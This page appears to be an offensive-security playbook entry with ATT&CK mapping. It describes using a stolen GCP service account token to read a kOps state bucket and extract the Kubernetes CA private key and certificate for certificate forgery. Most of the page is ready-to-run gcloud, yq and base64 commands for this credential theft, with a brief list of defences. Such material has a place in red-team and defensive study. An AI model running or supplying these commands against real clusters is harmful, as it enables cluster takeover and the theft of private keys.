---
id: proc-3
name: Extract-Kubernetes-CA-Keys-from-State-Bucket
tags:
  - gcp
  - gcs
  - pki-theft
type: procedure
tools:
  - '[[tools/gcloud]]'
  - '[[tools/yq]]'
  - '[[tools/base64]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/gcloud-auth-revoke]]'
  - '[[commands/export-cloudsdk-token]]'
  - '[[commands/mkdir-keys]]'
  - '[[commands/gcloud-storage-cat-private-key]]'
  - '[[commands/gcloud-storage-cat-public-cert]]'
verified: false
platforms:
  - GCP
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unsecured Credentials]]'
updated_at: '2025-12-14T17:30:18.575Z'
sub_techniques:
  - '[[Credentials In Files]]'
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Unsecured Credentials]]'
---
# Extract-Kubernetes-CA-Keys-from-State-Bucket

## Summary

Uses the stolen service account token to access the kOps state bucket and extract base64-encoded Kubernetes CA private key and public certificate.

## Description

kOps stores cluster state including PKI in a GCS bucket accessible by all node service accounts. This procedure authenticates gcloud with the token, cats the keyset.yaml, parses with yq, and decodes to PEM files, providing materials for certificate forgery.

## Requirements

1. default.token from metadata
2. gcloud and yq installed locally
3. Bucket path known (e.g., gs://kops-state-test/)

## Defense

- Restrict bucket IAM to specific service accounts only
- Encrypt state bucket objects
- Use private buckets without node access

## Objectives

1. Download keyset.yaml from GCS
2. Decode private key and public cert
3. Prepare for CA signing

## Instructions

### Step 1: Revoke and Set Token Auth

**Context**: Clear local auth and use stolen token for gcloud.

**Command** ([[commands/gcloud-auth-revoke]]):
```bash
gcloud auth revoke
```

> Revokes existing. Expected output: Auth cleared.

**Command** ([[commands/export-cloudsdk-token]]):
```bash
export CLOUDSDK_AUTH_ACCESS_TOKEN=$(jq .access_token -r ./default.token)
```

> Sets env var. Expected output: Token exported.

### Step 2: Create Keys Directory

**Context**: Prepare local storage for extracted keys.

**Command** ([[commands/mkdir-keys]]):
```bash
mkdir -p keys
```

> Creates dir. Expected output: keys/ exists.

### Step 3: Extract Private CA Key

**Context**: Cat, parse, and decode private material.

**Command** ([[commands/gcloud-storage-cat-private-key]]):
```bash
gcloud storage cat gs://kops-state-test/kops.k8s.local/pki/private/kubernetes-ca/keyset.yaml | yq e '.spec.keys[0].privateMaterial' - | base64 -d > keys/ca.key
```

> Saves private key. Expected output: ca.key file.

### Step 4: Extract Public CA Cert

**Context**: Cat, parse, and decode public material.

**Command** ([[commands/gcloud-storage-cat-public-cert]]):
```bash
gcloud storage cat gs://kops-state-test/kops.k8s.local/pki/private/kubernetes-ca/keyset.yaml | yq e '.spec.keys[0].publicMaterial' - | base64 -d > keys/ca.pem
```

> Saves cert. Expected output: ca.pem file.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Unsecured Credentials]] Unsecured Credentials

### Sub-Techniques

- [[Credentials In Files]] Credentials In Files

## Commands Used

- [[commands/gcloud-auth-revoke]]
- [[commands/export-cloudsdk-token]]
- [[commands/mkdir-keys]]
- [[commands/gcloud-storage-cat-private-key]]
- [[commands/gcloud-storage-cat-public-cert]]

## Tools Used

- [[tools/gcloud]]
- [[tools/yq]]
- [[tools/base64]]

## Tags

- gcp
- gcs
- pki-theft
